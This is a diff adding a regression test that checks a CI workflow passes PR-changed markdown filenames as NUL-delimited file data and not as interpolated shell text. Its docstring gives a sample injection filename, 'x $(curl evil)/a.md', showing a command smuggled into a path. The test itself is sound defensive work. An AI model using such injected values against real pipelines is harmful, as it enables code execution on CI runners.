@@ -3895,6 +3895,82 @@ def test_docs_job_main_health_uses_a_safe_post_merge_gate():
     assert link["with"].get("failIfEmpty") is False
 
 
+def test_docs_job_pr_path_never_interpolates_filenames():
+    """#4449: the PR path's changed-markdown list is DATA, never shell text.
+
+    The main-health path was fixed and pinned by
+    ``test_docs_job_main_health_uses_a_safe_post_merge_gate``. The PR path kept
+    ``${{ steps.changed.outputs.files }}`` interpolated into a ``run:`` AND into
+    lychee's ``args:``, and it stayed unreachable only because the PR checkout
+    was SHALLOW: with no ``github.event.pull_request.base.sha`` in the object
+    store the ``git diff`` failed, ``|| true`` swallowed it, the list came out
+    empty, and both consuming steps were skipped. That is an accident of the
+    checkout depth, not a control (#4449). Deepen the checkout and a list of
+    PR-AUTHOR-CONTROLLED filenames reaches a shell, where a path like
+    ``x $(curl evil)/a.md`` executes on the runner — including on a fork PR.
+
+    Both arms are pinned: the list is produced NUL-delimited into a FILE, and
+    each consumer reads that file (``xargs -0`` / ``--files-from``) instead of
+    receiving interpolated text.
+    """
+    steps = _load_workflow("ci.yml")["jobs"]["docs"]["steps"]
+
+    changed = next(s for s in steps if s.get("id") == "changed")
+    run = changed["run"]
+    # Produced NUL-delimited, into a file under $RUNNER_TEMP — never captured
+    # into a step output as text.
+    assert "-z" in run and "--name-only" in run
+    assert "$RUNNER_TEMP" in run
+    assert 'echo "files=' not in run, (
+        "the PR path must not publish the filenames as step OUTPUT text: a "
+        "later `${{ steps.changed.outputs.files }}` re-parses them as shell"
+    )
+    assert "count=" in run
+
+    # The diff MUST stay tolerant. A shallow PR checkout has no base sha, so
+    # the diff exits 128; under Actions' `bash -e` (and this step's own
+    # `set -euo pipefail`) that aborts the step — and `docs` is a REQUIRED
+    # status check, so a hard failure reds every PR. The tolerance is the
+    # pre-existing behaviour, and it is the difference between "this path is
+    # dormant" and "this path is red".
+    assert "|| :" in run or "|| true" in run, (
+        "the PR-path diff must tolerate a missing base sha; without it the step "
+        "hard-fails on every PR and reds the REQUIRED `docs` context"
+    )
+
+    lint = next(
+        s for s in steps if str(s.get("name", "")) == "Markdownlint (changed files)"
+    )
+    assert "xargs -0" in lint["run"], (
+        "markdownlint must consume the NUL list as ARGV, not as expanded text"
+    )
+    assert "steps.changed.outputs.files" not in lint["run"]
+    assert "${{ steps.changed" not in lint["run"]
+
+    link = next(
+        s for s in steps if str(s.get("name", "")) == "Link check (changed files)"
+    )
+    assert "--files-from" in link["with"]["args"], (
+        "lychee must read the list from a FILE"
+    )
+    assert "steps.changed.outputs.files" not in link["with"]["args"]
+    assert "${{ steps.changed" not in link["with"]["args"]
+    # A link-free markdown file is legitimate.
+    assert link["with"].get("failIfEmpty") is False
+
+    # Both consumers must ALSO be guarded on the PR path: the main-health path
+    # sets no `changed` output, so an unguarded `count != '0'` would be TRUE on
+    # an empty count and run the step on the nightly with no list.
+    for step in (lint, link):
+        cond = str(step.get("if", ""))
+        assert "!inputs.main_health" in cond, (
+            f"{step.get('name')!r} must stay on the PR path only"
+        )
+        assert "count" in cond, (
+            f"{step.get('name')!r} must gate on the produced list, not on `files`"
+        )
+
+
 def test_main_health_nightly_calls_ci_yml_and_never_gates_main():
     wf = _load_workflow("main-health-nightly.yml")
     on = _on_block(wf)
